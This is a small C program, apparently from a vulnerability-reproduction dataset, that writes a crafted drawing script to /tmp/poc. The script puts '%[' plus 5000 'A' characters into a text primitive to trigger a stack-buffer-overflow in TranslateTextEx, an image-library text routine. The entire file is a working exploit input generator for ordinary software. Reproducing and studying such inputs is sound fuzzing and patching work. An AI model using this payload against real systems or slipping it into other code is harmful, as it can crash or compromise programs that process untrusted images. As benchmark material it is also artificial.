#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    /* PoC for CVE: arvo:10055 */
    /* Triggers: stack-buffer-overflow in TranslateTextEx */
    /* Vuln class: stack_buffer_overflow */
    
    /* Format: "viewbox 0 0 100 100\npush graphic-context\ntext 0,0 '%[" followed by 5000 'A's, and closed with "]'\npop graphic-context" */
    /* CRITICAL: Do NOT escape the '%' as '%%' in C. Write exactly one '%'. */
    char poc[6000];
    int offset = snprintf(poc, sizeof(poc), "viewbox 0 0 100 100\npush graphic-context\ntext 0,0 '%%[");
    memset(poc + offset, 'A', 5000);
    offset += 5000;
    snprintf(poc + offset, sizeof(poc) - offset, "]'\npop graphic-context");
    
    size_t poc_len = strlen(poc);
    
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    fwrite(poc, 1, poc_len, f);
    fclose(f);
    return 0;
}